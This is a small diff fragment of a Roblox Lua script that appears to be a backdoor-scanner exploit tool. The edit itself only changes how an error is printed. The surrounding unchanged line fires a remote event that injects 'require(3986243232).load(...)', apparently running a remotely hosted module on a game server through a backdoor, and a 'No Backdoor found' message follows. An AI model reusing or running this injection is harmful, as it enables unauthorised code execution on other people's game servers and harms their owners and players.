@@ -2639,7 +2639,7 @@ UpdateVisibilityBasedOnRigType()
                         fireRemoteEvent('require(3986243232).load("im gay",{"' .. game.Players.LocalPlayer.Name ..  '"})')
                       end)
                    if not success then 
-                     print("Error: " .. result)
+                     print("Error: ", result)
                    end
 		else
 			script.Parent.Framee.Check.Text = "No Backdoor found :("
